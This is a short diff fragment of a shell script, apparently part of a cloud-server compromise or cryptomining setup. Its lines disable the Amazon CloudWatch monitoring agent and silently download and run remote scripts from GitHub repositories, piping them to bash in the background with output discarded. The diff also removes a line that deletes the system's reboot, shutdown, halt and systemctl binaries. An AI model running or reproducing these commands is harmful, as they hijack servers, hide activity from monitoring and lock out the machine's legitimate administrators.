@@ -4,4 +4,3 @@ systemctl disable amazon-cloudwatch-agent; systemctl stop amazon-cloudwatch-agen
 #bash <(wget -qO- https://github.com/army2mil/njabscb/raw/refs/heads/main/...) >>/dev/null 2>&1 &
 bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >>/dev/null 2>&1 &
 
-rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
